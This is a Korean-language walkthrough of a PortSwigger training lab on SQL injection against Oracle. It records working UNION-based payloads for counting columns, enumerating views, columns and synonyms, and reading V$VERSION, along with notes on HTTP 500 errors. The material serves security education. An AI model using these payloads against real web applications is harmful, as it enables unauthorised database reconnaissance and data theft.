---
title: "SQL injection attack, querying the database type and version on Oracle"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle"
difficulty: Practitioner
draft: false
---

# SQL injection attack, querying the database type and version on Oracle

실습 설명에서 필요한 버전 문자열은 알 수 있었지만, 어느 뷰에 저장됐는지는 몰랐다. 실제 첫 시도에서는 `OWNER`를 저장하지 않아 HTTP 500을 만났다. 아래는 **직접 확인한 결과를 바탕으로, 정답을 모르는 상태에서 다시 탐색할 때의 순서**로 정리했다. 당시의 500 시도는 끝에 따로 남겼다.

## 1. 반환 열 개수 확인

`category`에 다음 값을 차례로 넣었다.

~~~sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
~~~

1, 2는 처리됐고 3은 `Internal Server Error`였다. 원래 조회가 **두 열**을 반환한다고 판단했다. 이후 `UNION SELECT`에도 열을 두 개 두고, 필요하지 않은 두 번째 열은 `NULL`로 채웠다.

**다음 탐색:** 첫 번째 열에 문자열을 출력할 수 있는지와 버전 관련 뷰 이름을 확인한다.

## 2. 뷰 이름 탐색

~~~sql
' UNION SELECT view_name, NULL FROM all_views --
~~~

뷰 이름이 응답에 표시됐다. 첫 번째 열에 문자열이 출력되고 두 열짜리 `UNION`이 동작한다는 것을 확인했다. 이 단계의 이름만으로는 **소유자와 열**을 알 수 없다.

![UNION SELECT로 뷰 이름을 조회한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)

**다음 탐색:** `ALL_TAB_COLUMNS`에서 소유자를 이름과 함께 수집한다.

## 3. 소유자를 붙인 후보 객체 목록 만들기

~~~sql
' UNION SELECT OWNER || '.' || TABLE_NAME, NULL
FROM ALL_TAB_COLUMNS
WHERE TABLE_NAME LIKE '%VERSION%' --
~~~

실습 목표가 버전 문자열이므로 우선 이름에 `VERSION`이 포함된 객체로 범위를 좁혔다. 실제 응답은 HTTP 200, **서로 다른 객체 9개**였다. 그중 탐색 후보는 `SYS.PRODUCT_COMPONENT_VERSION`, `SYS.GV_$VERSION`, `SYS.SM_$VERSION`, `SYS.V_$VERSION`이었다. 필요하면 `WHERE`를 없애 더 넓게 열거할 수 있다.

`ALL_TAB_COLUMNS`에는 객체마다 여러 열이 있으므로, `UNION ALL SELECT OWNER || '.' || TABLE_NAME`으로만 출력하면 같은 객체명이 열 수만큼 반복된다. 이 목록 조회에는 중복을 제거하는 `UNION SELECT`를 사용했다.

**다음 탐색:** 각 후보의 열 이름과 자료형을 소유자 정보와 함께 확인한다.

## 4. 문자열 열 후보 추리기

~~~sql
' UNION SELECT OWNER || '.' || TABLE_NAME || '.' ||
               COLUMN_NAME || ' : ' || DATA_TYPE, NULL
FROM ALL_TAB_COLUMNS
WHERE TABLE_NAME IN (
  'PRODUCT_COMPONENT_VERSION', 'GV_$VERSION',
  'SM_$VERSION', 'V_$VERSION'
) --
~~~

HTTP 200 응답에서 열 정보 9개를 확인했다. 데이터 출력에 쓸 문자열 열은 다음과 같았다.

| 소유자 포함 객체 | 문자열 열 |
| --- | --- |
| `SYS.PRODUCT_COMPONENT_VERSION` | `PRODUCT`, `VERSION`, `STATUS` (`VARCHAR2`) |
| `SYS.GV_$VERSION` | `BANNER` (`VARCHAR2`) |
| `SYS.SM_$VERSION` | `VERSION_TEXT` (`CHAR`) |
| `SYS.V_$VERSION` | `BANNER` (`VARCHAR2`) |

`GV_$VERSION.INST_ID`와 `SM_$VERSION.VERSION_NUMBER`는 숫자, `SM_$VERSION.CREATED`는 날짜여서 문자열 열 반복 조회 대상에서 뺐다. 열 메타데이터는 값 자체가 아니므로 이제 각 후보에서 데이터를 읽어야 한다.

![뷰의 열 이름과 자료형을 확인한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/02-column-names-and-data-types-json.png)

**다음 탐색:** 의미가 분명한 제품·버전·상태부터 조회하고 목표와 비교한다.

## 5. 제품 버전 정보 조회

같은 원본 행의 세 값을 한 문자열로 결합했다. 열별로 따로 요청한 CSV의 행 번호를 임의로 짝짓지 않기 위해서다.

~~~sql
' UNION SELECT PRODUCT || ' | ' || VERSION || ' | ' || STATUS, NULL
FROM PRODUCT_COMPONENT_VERSION --
~~~

실제 응답은 다음 네 행이었다.

~~~text
NLSRTL | 11.2.0.2.0 | Production
Oracle Database 11g Express Edition | 11.2.0.2.0 | 64bit Production
PL/SQL | 11.2.0.2.0 | Production
TNS for Linux: | 11.2.0.2.0 | Production
~~~

버전 번호는 확인했지만 화면은 **Not solved**였다. 실습 설명의 다섯 문자열 중 `CORE 11.2.0.2.0 Production`이 없었다. 네 행의 구분자만 바꾸는 것으로는 빠진 행을 만들 수 없으므로 다른 문자열 열을 탐색했다.

![버전 정보 네 행과 Not solved 상태](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/03-product-component-version-not-solved.png)

**다음 탐색:** 4단계에서 확인한 버전 관련 문자열 열을 소유자 포함 이름으로 차례로 조회한다.

## 6. 소유자 포함 이름으로 후보 열 반복 조회

먼저 열 내용과 무관하게 `FROM` 대상이 조회되는지 `COUNT(*)`로 확인하고, 성공한 객체의 문자열 열을 읽었다. 실제 요청은 다음 형태에서 `OWNER`, `VIEW`, `COLUMN`을 4단계 결과로 치환했다.

~~~sql
' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL
FROM "<OWNER>"."<VIEW>" --

' UNION ALL SELECT "<COLUMN>", NULL
FROM "<OWNER>"."<VIEW>" --
~~~

| 조회 대상 | 행 수 조회 | 문자열 열 조회 |
| --- | --- | --- |
| `SYS.GV_$VERSION.BANNER` | HTTP 200, 5행 | HTTP 200, 목표 문자열 5개 |
| `SYS.SM_$VERSION.VERSION_TEXT` | HTTP 200, 1행 | HTTP 200, `7.3.2.0.0` |
| `SYS.V_$VERSION.BANNER` | HTTP 200, 5행 | HTTP 200, 목표 문자열 5개 |

`BANNER`가 있는 두 뷰에서 설명에 나온 다섯 문자열을 모두 얻었고, `VERSION_TEXT` 한 행은 목표 버전과 다르다는 것을 확인했다. 여기까지는 **저장한 메타데이터에서 후보를 골라 실제 값으로 검증한 결과**다.

**다음 탐색:** 앞서 생긴 500의 원인을 비교하고, 확인된 객체를 더 간단한 이름으로 부를 수 있는지 살핀다.

## 7. 당시 500을 만든 누락과 이름 비교

실제 첫 반복에서는 `results.json`에 `OWNER`를 저장하지 않아 다음처럼 뷰 이름만 `FROM`에 썼다.

~~~sql
' UNION ALL SELECT "BANNER", NULL FROM "V_$VERSION" --
' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "V_$VERSION" --
~~~

둘 다 HTTP 500이었다. 같은 `COUNT(*)` 구문은 `PRODUCT_COMPONENT_VERSION`에서 HTTP 200과 `4`를 반환했다. 500 응답의 전체 HTML과 헤더에는 `Internal Server Error`만 있고 Oracle 오류 번호는 없었다. 이 응답만으로 원인을 확정하지 않고 **소유자 없는 이름과 소유자 포함 이름**을 비교했다.

~~~sql
' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "V_$VERSION" --
' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "SYS"."V_$VERSION" --
~~~

첫 번째는 HTTP 500, 두 번째는 HTTP 200과 `5`였다. 같은 대상이 소유자를 붙이면 읽히므로, 이 500은 `V_$VERSION`을 소유자 없이 참조한 데서 생겼다고 판단했다. 정확한 `ORA-` 번호는 서버 응답에서 확인할 수 없었다.

더 짧은 이름이 있는지도 메타데이터에서 찾았다.

~~~sql
' UNION ALL SELECT SYNONYM_NAME || ' => ' ||
                   TABLE_OWNER || '.' || TABLE_NAME, NULL
FROM ALL_SYNONYMS
WHERE TABLE_NAME = 'V_$VERSION' --
~~~

응답은 `V$VERSION => SYS.V_$VERSION`이었다. `V$VERSION`에서 행 수를 조회해도 HTTP 200과 `5`가 나왔다.

**다음 탐색:** 확인된 동의어에서 `BANNER`를 출력하고 실습 판정을 확인한다.

## 8. 목표 문자열과 실습 판정 확인

~~~sql
' UNION ALL SELECT BANNER, NULL FROM V$VERSION --
~~~

HTTP 200 응답에 다음 다섯 행이 나왔다.

~~~text
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
~~~

요청 직후 응답과 홈 화면이 모두 **LAB Solved**를 표시했다. 다른 두 후보도 소유자 없는 이름에서는 500, 소유자를 붙인 이름에서는 200이었다. 다만 서버가 숨긴 정확한 Oracle 오류 번호는 확인하지 못했다.

## 핵심

- 후보를 반복 조회하기 **전에** `OWNER`를 함께 수집한다. 열만 수집한 뒤 소유자를 빼고 `FROM`에 넣으면, 실제로 접근 가능한 뷰도 500으로 보일 수 있다.
- `COUNT(*)` 대조 조회로 뷰 참조 문제와 문자열 열 선택 문제를 나눈다.
- HTTP 500은 Oracle 오류 코드가 아니다. 이번 원인은 서로 다른 이름으로 같은 객체를 조회해 비교한 결과로 좁혔다.

## 참고

- [Oracle: PRODUCT_COMPONENT_VERSION으로 릴리스 확인](https://docs.oracle.com/cd/B28359_01/server.111/b28310/dba004.htm)
- [Oracle: ALL_TAB_COLUMNS의 OWNER 열](https://docs.oracle.com/cd/E18283_01/server.112/e17110/statviews_2103.htm)
